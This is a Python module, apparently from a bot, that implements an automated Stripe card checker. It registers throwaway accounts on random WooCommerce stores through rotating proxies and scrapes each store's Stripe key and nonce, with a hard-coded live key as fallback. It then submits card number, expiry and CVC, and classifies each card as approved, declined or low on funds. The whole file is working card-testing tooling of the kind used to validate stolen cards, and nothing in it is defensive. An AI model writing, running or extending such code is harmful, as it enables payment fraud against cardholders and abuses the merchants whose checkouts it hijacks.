# utils/stripe_checker.py
"""Utility functions for automated Stripe card checking.
This module mirrors the original JavaScript implementation but is written
in Python for use with the new backend architecture.
It includes:
- Account registration on a random WooCommerce site
- Extraction of Stripe publishable key and AJAX nonce
- Creation of a payment method via Stripe API
- Final verification through the site's AJAX endpoint
"""

import random
import string
import json
import re
import requests
from bot_info import PROXIES, STRIPE_DOMAINS

# ----------------------------------------------------------------------
# Helper generators
# ----------------------------------------------------------------------

def generate_random_email() -> str:
    """Return a random email address for test registrations."""
    random_string = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"test{random_string}@test.com"


def generate_random_username() -> str:
    """Return a random username consisting of 'user' + 6 digits."""
    return "user" + "".join(random.choices(string.digits, k=6))

# ----------------------------------------------------------------------
# Account registration
# ----------------------------------------------------------------------

def register_new_account(domain: str):
    """Register a temporary account on a WooCommerce site.

    Returns a tuple ``(session, result_msg)`` where ``session`` is a
    ``requests.Session`` ready for further calls, or ``None`` on failure.
    """
    register_url = f"https://{domain}/my-account/"
    username = generate_random_username()
    email = generate_random_email()
    password = "TestPassword123!"
    credentials = {
        "username": username,
        "email": email,
        "password": password,
        "woocommerce-register-nonce": "",
        "register": "Register",
        "_wp_http_referer": "/my-account/",
    }
    session = requests.Session()
    # Apply proxy configuration from bot_info
    if isinstance(PROXIES, list) and PROXIES:
        proxy = random.choice(PROXIES)
        session.proxies.update({"http": proxy, "https": proxy})
    elif isinstance(PROXIES, dict):
        session.proxies.update(PROXIES)
    elif isinstance(PROXIES, str) and PROXIES:
        session.proxies.update({"http": PROXIES, "https": PROXIES})
    session.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/137.0.0.0 Safari/537.36"
        )
    })
    try:
        response = session.get(register_url)
        if response.status_code != 200:
            return None, "Error"
        # Extract the nonce via regex (avoids bs4 dependency)
        nonce_match = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', response.text)
        if not nonce_match:
            nonce_match = re.search(r'value="([^"]+)"[^>]*name="woocommerce-register-nonce"', response.text)
        if nonce_match:
            credentials["woocommerce-register-nonce"] = nonce_match.group(1)
        else:
            return None, "No nonce"
        register_response = session.post(register_url, data=credentials, allow_redirects=True)
        if register_response.status_code == 200:
            if "my-account" in register_response.url and "logout" in register_response.text:
                return session, "Success"
        return None, "Register failed"
    except Exception as e:
        return None, f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Stripe data extraction
# ----------------------------------------------------------------------

def extract_stripe_data(session: requests.Session, domain: str):
    """Retrieve the Stripe publishable key and AJAX nonce from the add‑payment page."""
    add_payment_url = f"https://{domain}/my-account/add-payment-method/"
    try:
        response = session.get(add_payment_url)
        if response.status_code != 200:
            return None, None, "Page error"
        html_content = response.text
        # Search for publishableKey (live or test)
        stripe_key = None
        key_patterns = [
            r'publishableKey["\']?\s*:\s*["\'](pk_live_[^"\']+)["\']',
            r'publishableKey["\']?\s*:\s*["\'](pk_test_[^"\']+)["\']',
            r'pk_live_[a-zA-Z0-9_]+',
            r'pk_test_[a-zA-Z0-9_]+'
        ]
        for pattern in key_patterns:
            match = re.search(pattern, html_content)
            if match:
                stripe_key = match.group(1) if match.lastindex else match.group(0)
                break
        # Search for AJAX nonce
        nonce = None
        nonce_patterns = [
            r'_ajax_nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']',
            r'nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']',
            r'ajax_nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']'
        ]
        for pattern in nonce_patterns:
            match = re.search(pattern, html_content)
            if match:
                nonce = match.group(1)
                break
        # Fallback key (hard‑coded live key) – mirrors original JS fallback
        if not stripe_key:
            stripe_key = "pk_live_51H2KFNGxiXToSgUABz7o7Y57zaHbmaYs5GQS80fk2GNBI3uUjZ3Dvgh4wptaQnuIsOIJ9hoYzAT7zZ7s5jZVj1AB00qFH2vEZs"
        if not nonce:
            return None, None, "No nonce found"
        return stripe_key, nonce, "Success"
    except Exception as e:
        return None, None, f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Stripe payment method creation
# ----------------------------------------------------------------------

def create_stripe_payment_method(stripe_key: str, card_number: str, exp_month: str, exp_year: str, cvc: str, domain: str):
    """Create a payment method via Stripe's public API.

    Returns ``(payment_method_id, status_msg)``.
    """
    try:
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            "Authorization": f"Bearer {stripe_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Origin": f"https://{domain}",
            "Referer": f"https://{domain}/my-account/add-payment-method/"
        }
        stripe_data = {
            "type": "card",
            "card[number]": card_number,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvc,
        }
        stripe_response = requests.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=10)
        if stripe_response.status_code == 200:
            resp_json = stripe_response.json()
            return resp_json.get("id"), "success"
        else:
            err = stripe_response.json().get("error", {})
            return None, f"{err.get('code','') }|{err.get('message','')}"
    except Exception as e:
        return None, f"error|{str(e)}"

# ----------------------------------------------------------------------
# Final AJAX request to confirm the setup intent
# ----------------------------------------------------------------------

def make_stripe_ajax_request(session: requests.Session, payment_method_id: str, nonce: str, domain: str):
    """Send the final AJAX request that confirms the Stripe setup intent."""
    ajax_url = f"https://{domain}/wp-admin/admin-ajax.php"
    headers = {
        "authority": domain,
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": f"https://{domain}",
        "referer": f"https://{domain}/my-account/add-payment-method/",
        "x-requested-with": "XMLHttpRequest",
    }
    session.headers.update(headers)
    data = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": payment_method_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    return session.post(ajax_url, data=data, timeout=10)

# ----------------------------------------------------------------------
# Public entry point used by the bot
# ----------------------------------------------------------------------

def check_stripe_card(cc_data: str):
    """Validate a credit‑card string ``<number>|<exp_month>|<exp_year>|<cvc>``.
    Returns a tuple ``(status, detail, extra)`` where ``status`` is one of
    "Approved", "Declined", "Invalid", "Expired", "Error".
    """
    try:
        parts = cc_data.split("|")
        if len(parts) != 4:
            return "Error", "Invalid format", ""
        card_number, exp_month, exp_year, cvc = map(str.strip, parts)
        domain = random.choice(STRIPE_DOMAINS)
        session, register_result = register_new_account(domain)
        if not session:
            return "Error", "Account creation failed", ""
        stripe_key, nonce, extract_result = extract_stripe_data(session, domain)
        if not nonce:
            return "Error", "Data extraction failed", ""
        payment_method_id, pm_result = create_stripe_payment_method(
            stripe_key, card_number, exp_month, exp_year, cvc, domain
        )
        if not payment_method_id:
            # Parse error codes returned by Stripe
            if "|" in pm_result:
                error_code, error_msg = pm_result.split("|", 1)
                mapping = {
                    "card_declined": ("Declined", "Card Declined"),
                    "incorrect_number": ("Invalid", "Invalid Card Number"),
                    "invalid_cvc": ("Invalid", "Invalid CVC"),
                    "invalid_expiry_month": ("Invalid", "Invalid Expiry Month"),
                    "invalid_expiry_year": ("Invalid", "Invalid Expiry Year"),
                    "expired_card": ("Expired", "Card Expired"),
                }
                if error_code in mapping:
                    return mapping[error_code][0], mapping[error_code][1], ""
                if "test card" in error_msg.lower():
                    return "Declined", "Test Card in Live Mode", ""
                
                # Si el error no está mapeado, devolver el mensaje real que nos dio Stripe (error_msg)
                # en lugar de ocultarlo como "Card Declined"
                return "Declined", error_msg.capitalize(), ""
            else:
                return "Error", f"Payment method creation failed: {pm_result}", ""
        response = make_stripe_ajax_request(session, payment_method_id, nonce, domain)
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success"):
                    return "Approved", "Approved", ""
                # Extract error information from the payload
                error_msg = (data.get("data") or {}).get("message", "Unknown error")
                low = error_msg.lower()
                if "declined" in low:
                    if "call issuer" in low:
                        return "Declined", "Call Issuer", ""
                    if "insufficient funds" in low:
                        return "Declined", "Insufficient Funds", ""
                    return "Declined", "Card Declined", ""
                if "invalid" in low:
                    return "Invalid", "Invalid Card", ""
                if "expired" in low:
                    return "Expired", "Card Expired", ""
                return "Declined", "Card Declined", ""
            except json.JSONDecodeError:
                return "Declined", "Card Declined", ""
        else:
            return "Error", f"HTTP {response.status_code}", ""
    except Exception:
        return "Error", "System error", ""

# Exported symbols for convenient imports
__all__ = [
    "generate_random_email",
    "generate_random_username",
    "register_new_account",
    "extract_stripe_data",
    "create_stripe_payment_method",
    "make_stripe_ajax_request",
    "check_stripe_card",
]
